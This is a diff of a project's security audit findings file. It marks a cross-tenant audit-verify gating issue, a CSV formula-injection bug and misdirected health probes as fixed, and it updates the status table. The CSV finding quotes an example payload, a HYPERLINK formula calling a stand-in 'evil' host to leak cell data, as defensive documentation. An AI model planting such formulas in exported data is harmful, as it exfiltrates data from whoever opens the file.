@@ -67,41 +67,52 @@ control chars and is covered by `safe-next.test.ts`.
 
 ### 🟡 MEDIUM (open)
 
-**B2. `POST /v1/audit/verify` is un-scoped across tenants, open to every role**
-**Where:** `apps/server/src/routes/audit.ts` (the `verify` handler; `listAudit(deps.db, { limit: 1000, sinceId })` with no `orgId`), guarded only by `audit.read` — which `packages/rbac/src/matrix.ts` grants to `reader`.
+**B2. `POST /v1/audit/verify` gating was implicit/fragile — now `FIXED`** ✎
+**Where:** `apps/server/src/routes/audit.ts` (the `verify` handler; `listAudit(deps.db, { limit: 1000, sinceId })` with no `orgId`).
 
-`GET /v1/audit` was carefully org-scoped in `AUDIT-FINDINGS-2` H3, but `verify`
-walks the **entire global** audit table and returns `checked` (system-wide
-row count across all orgs) and `broken_at_id` (a global row id). Any
-authenticated user of any tenant — including a low-privilege `reader` — can (a)
-learn cross-tenant audit volume and (b) repeatedly force a full-table scan with
-per-row HMAC recomputation (resource-exhaustion, bounded only by the 120/min
-limiter).
-**Suggested fix:** restrict `verify` to owner/admin and/or scope it to the
-caller's org and return only a boolean.
+`verify` walks the **entire global** audit table (it can't be org-scoped — the
+HMAC chain interleaves all orgs into one append-only sequence) and returns
+`checked` (system-wide row count) and `broken_at_id` (a global row id).
 
-**B3. CSV formula injection in the audit export**
+**Correction after verification:** the original claim that a `reader` could reach
+it is **not exploitable today**. `verify` was guarded by `audit.read`, a
+*project-level* action, and the route passes **no** project context, so
+`authorize()` denies every non-owner/admin caller at the `if (!projectId) return
+'deny'` branch (`packages/rbac/src/authorize.ts`). So it was already
+owner/admin-only — but only *by accident* of the route not passing a project id;
+a future edit that threaded a `project_id` (or a reader with any membership)
+would have opened it, and the matrix listing `audit.read` for all five roles
+made that look intentional.
+
+**Fix applied:** added a dedicated **org-level** `audit.verify` action granted to
+`['owner','admin']` and switched the route to `guard(c, 'audit.verify')`. The
+restriction is now explicit and independent of project context. (The
+resource-exhaustion surface remains for owner/admin, who are trusted.)
+
+**B3. CSV formula injection in the audit export** — `FIXED`
 **Where:** `apps/web/app/(authed)/audit/_actions/export-action.ts` (`csvEscape`)
 
-`csvEscape` quotes fields containing `,` / `"` / newline but does **not**
+`csvEscape` quoted fields containing `,` / `"` / newline but did **not**
 neutralize spreadsheet formula prefixes (`=`, `+`, `-`, `@`, tab, CR). The
 `actor_agent` column is client-controlled: the server stores the `X-Keynv-Agent`
 header verbatim (documented as untrusted in `apps/server/src/lib/agent.ts`). An
 attacker makes any authed request with an agent header like
 `=HYPERLINK("http://evil/?"&A1)`; when an admin exports the audit log and opens
 it in Excel/Sheets, the formula executes in the admin's context.
-**Suggested fix:** prefix at-risk cells (those starting with `= + - @` tab/CR)
-with a `'` or wrap them so the spreadsheet won't evaluate them.
+**Fix applied:** cells beginning with `= + - @` / tab / CR are prefixed with a
+single quote before CSV-quoting. (B5 fixed in the same function.)
 
-**B4. Deploy liveness/readiness probes target an endpoint that never fails** ✎
+**B4. Deploy liveness/readiness probes target an endpoint that never fails** — `FIXED` ✎
 **Where:** `deploy/docker-compose.yml`, `deploy/coolify.yml`, `deploy/helm/keynv/templates/statefulset.yaml`
 
 All probes hit `/v1/health`, whose handler always returns HTTP 200 even when the
 DB check fails (it only flips `ok:false` in the body, `apps/server/src/routes/health.ts`).
-The purpose-built `/v1/health/ready` (returns **503** on DB failure) is unused
+The purpose-built `/v1/health/ready` (returns **503** on DB failure) was unused
 everywhere. Consequence: a server whose DB is broken stays "healthy" in Compose
 and "Ready" in Kubernetes, so traffic keeps routing to it and it never restarts.
-**Suggested fix:** point liveness/readiness at `/v1/health/ready`.
+**Fix applied:** k8s livenessProbe → `/v1/health/live` (process-only, no restart
+loop on a DB blip); k8s readinessProbe + Compose/Coolify healthcheck →
+`/v1/health/ready` (drains traffic / marks unhealthy on DB failure).
 
 ### 🔵 LOW (open)
 
@@ -261,22 +272,25 @@ note.)
 | Y1 | HIGH | redactor | **FIXED** — single left-to-right pass + `join` (O(n)) |
 | K2 | CRITICAL | cli/init | **FIXED** — `--yes` treats `ambiguous` as secret (fail-safe) |
 | B1 | HIGH | web | **FIXED** — refresh route uses `safeNext()` |
+| Y2 | HIGH | cli/watcher, mcp | **FIXED** — 64 KB per-line buffer cap on both IPC sockets (+ regression test) |
+| B2 | MEDIUM | server | **FIXED** — dedicated org-level `audit.verify` action (owner/admin); gating now explicit (+ test) |
+| B3 | MEDIUM | web | **FIXED** — CSV export neutralizes `= + - @` / tab / CR formula prefixes |
+| B4 | MEDIUM | deploy | **FIXED** — liveness→`/health/live`, readiness/compose→`/health/ready` |
+| B5 | LOW | web | **FIXED** — CSV `payload` column now `JSON.stringify`'d (was `[object Object]`) |
 | K3 | HIGH* | redactor/shell | OPEN — codegen or CI-diff the shell bank |
-| Y2 | HIGH | cli/watcher, mcp | OPEN — cap IPC line buffers |
 | Y3 | HIGH | cli/init, text-surfaces | OPEN — collision-check backups |
 | Y4 | MEDIUM* | cli/init | OPEN — post-normalization key collision check |
-| B2–B4 | MEDIUM | server, web, deploy | OPEN — audit/verify scoping, CSV injection, health probes |
-| O1–O7, B5–B8 | MEDIUM/LOW | cross-cutting | OPEN |
+| O1–O7, B6–B8 | MEDIUM/LOW | cross-cutting | OPEN |
 | L1–L6 | LOW | tooling/hygiene | OPEN |
 
 \* severity revised from Cycle-3 during verification (Section A).
 
 ### Suggested next sequencing
 
-1. **B2 + B3** — small server/web security fixes (tenant-scope `verify`, CSV
-   formula guard). Same risk class as the fixes already landed.
-2. **B4 + B8** — point deploy probes at `/v1/health/ready`; make `min_cli_version`
-   derive from `pkg.version`. Both prevent silent operational drift.
-3. **K3, Y2, Y3, Y4** — robustness follow-ups from Cycle-3.
+1. **K3, Y3, Y4** — remaining robustness follow-ups from Cycle-3 (shell-bank
+   drift, same-bucket backup overwrite, key-normalization collision).
+2. **B6/B7 + B8** — reconcile the landing license/Cloud copy with the live
+   reality; make `min_cli_version` derive from `pkg.version`.
+3. **O-series** — comments-vs-reality, dead code, dedup, targeted auth unit tests.
 4. **Adoption pass** — opportunities 2–8 above, gated behind shipping `rc.22`
    (opportunity 1), which this session prepares.
